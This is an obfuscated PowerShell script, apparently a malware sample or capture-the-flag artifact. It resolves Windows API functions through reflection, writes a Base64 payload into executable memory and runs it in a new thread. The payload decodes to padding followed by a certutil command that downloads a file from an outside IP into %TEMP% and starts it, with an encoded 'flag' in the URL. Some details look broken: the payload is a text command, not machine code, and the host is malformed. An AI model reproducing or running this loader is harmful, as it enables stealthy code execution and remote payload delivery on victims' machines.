function i5P {
        Param ($cWo8x, $ip)
        $g8lN = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $g8lN.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($g8lN.GetMethod('GetModuleHandle')).Invoke($null, @($cWo8x)))), $ip))
}

function ma1_D {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $m4AK,
                [Parameter(Position = 1)] [Type] $vGu = [Void]
        )

        $fqGV5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $fqGV5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $m4AK).SetImplementationFlags('Runtime, Managed')
        $fqGV5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vGu, $m4AK).SetImplementationFlags('Runtime, Managed')

        return $fqGV5.CreateType()
}

[Byte[]]$nLQ2k = [System.Convert]::FromBase64String("ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==")
[Uint32]$fal3 = 0
$lc98 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualAlloc), (ma1_D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nLQ2k.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($nLQ2k, 0, $lc98, $nLQ2k.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll VirtualProtect), (ma1_D @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($lc98, [Uint32]$nLQ2k.Length, 0x10, [Ref]$fal3)) -eq $true) {
        $ubOb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll CreateThread), (ma1_D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lc98,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((i5P kernel32.dll WaitForSingleObject), (ma1_D @([IntPtr], [Int32]))).Invoke($ubOb,0xffffffff) | Out-Null
}

